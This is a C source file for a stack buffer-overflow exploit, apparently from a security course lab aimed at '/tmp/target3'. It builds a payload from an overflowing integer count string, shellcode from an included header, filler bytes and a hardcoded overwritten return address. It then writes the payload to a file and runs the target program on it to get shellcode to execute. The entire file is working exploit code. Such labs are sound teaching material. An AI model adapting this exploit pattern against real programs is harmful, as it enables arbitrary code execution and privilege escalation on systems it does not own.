#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target3"
#define DEFAULT_FILE "/tmp/xploit3_output"
#define SIZE 24024

struct widget_t {
  double x;
  double y;
  long count;
};

int main(void)
{
  /* testing
  struct widget_t dummy;
  size_t exploit_size = 2+2*sizeof(dummy);  // exploit size
  memcpy(exploit, "2,", sizeof(char)*2);
  memcpy((exploit+2), &dummy, sizeof(dummy));
  memcpy((exploit+sizeof(dummy)+2), &dummy, sizeof(dummy));
  */

  // this exploit will likely require more memory than fits on the stack
  char *count_str = "9223372036854776809,"; //"2147484649,"
  size_t exploit_size = SIZE + strlen(count_str);

  char *exploit = malloc(exploit_size);
  
  // fill exploit buffer
  memset(exploit, 'U', exploit_size);
  memcpy(exploit, count_str, strlen(count_str));
  memcpy(exploit+strlen(count_str), shellcode, sizeof(shellcode)-1);

  // pointer surgery to overwrite return address
  *(size_t *)(exploit + 24000 + 8 + strlen(count_str)) = 0x7ffffffe8f48;

  // write xploit buffer to file

  // Write xploit buffer to file
  write_xploit(exploit, exploit_size, DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
